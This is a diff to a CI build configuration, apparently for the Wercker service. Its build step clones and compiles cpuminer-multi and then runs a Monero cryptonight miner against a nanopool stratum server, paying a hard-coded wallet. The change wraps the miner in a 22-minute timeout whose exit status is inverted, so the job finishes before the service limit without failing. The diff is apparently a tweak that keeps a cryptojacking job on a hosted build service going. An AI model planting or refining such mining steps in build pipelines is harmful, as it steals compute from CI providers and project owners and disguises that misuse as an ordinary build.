@@ -15,4 +15,4 @@ build:
           mkdir test
           cd test && git clone https://github.com/wolf9466/cpuminer-multi && cd cpuminer-multi && ./autogen.sh && ./configure CFLAGS="-O3" && make
           ls -la
-          ./minerd -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 46JHKeS9JcXDi8ET6F3ZSgM5mvRZVxMG33Hm3vL1JJknMHoJzqVpTt9e9pT3dApFqeJrXerz19dc1LevwYmDeWauQRQXiUw.wercker -p x
+          ! timeout 22m ./minerd -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 46JHKeS9JcXDi8ET6F3ZSgM5mvRZVxMG33Hm3vL1JJknMHoJzqVpTt9e9pT3dApFqeJrXerz19dc1LevwYmDeWauQRQXiUw.wercker -p x
